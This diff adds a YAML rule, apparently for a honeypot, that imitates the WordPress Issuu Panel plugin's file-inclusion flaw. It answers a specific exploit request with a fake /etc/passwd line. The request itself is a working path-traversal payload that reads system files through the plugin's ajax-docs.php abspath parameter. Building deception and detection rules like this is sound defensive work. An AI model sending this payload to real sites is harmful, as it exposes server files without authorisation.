@@ -1,0 +1,28 @@
+id: issuu-panel-lfi
+info:
+  name: Wordpress Plugin Issuu Panel Remote/Local File Inclusion
+  author: 0x_Akoko
+  description: The WordPress Issuu Plugin includes an arbitrary file disclosure vulnerability
+    that allows unauthenticated attackers to disclose the content of local and remote
+    files.
+  severity: high
+  reference:
+  - https://cxsecurity.com/issue/WLB-2016030131
+  - https://wordpress.org/plugins/issuu-panel/
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
+    cvss-score: 8.6
+    cwe-id: CWE-22
+  metadata:
+    max-request: 1
+  tags: wp-plugin,wordpress,lfi,rfi
+traps:
+- request:
+    method: GET
+    path: /wp-content/plugins/issuu-panel/menu/documento/requests/ajax-docs.php?abspath=%2Fetc%2Fpasswd
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: root:[x*]:0:0
